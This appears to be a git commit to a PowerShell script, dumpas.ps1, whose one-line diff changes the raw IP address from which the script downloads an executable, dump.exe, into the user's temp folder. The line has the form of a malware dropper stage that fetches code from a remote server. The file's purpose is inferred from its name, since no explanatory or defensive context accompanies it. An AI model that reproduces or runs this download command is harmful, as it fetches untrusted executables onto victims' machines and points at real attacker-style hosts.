3c69b5539f47789c965913516d2dedb1f765061a
userdol <48455401+userdol@users.noreply.github.com>
2019-03-28 02:38:45 +0300

    Update dumpas.ps1

--- dumpas.ps1
+++ dumpas.ps1
@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("http://163.172.144.82/ex/dump.exe","$env:temp\dump.exe");
+(New-Object System.Net.WebClient).DownloadFile("http://23.106.160.239/dump.exe","$env:temp\dump.exe");
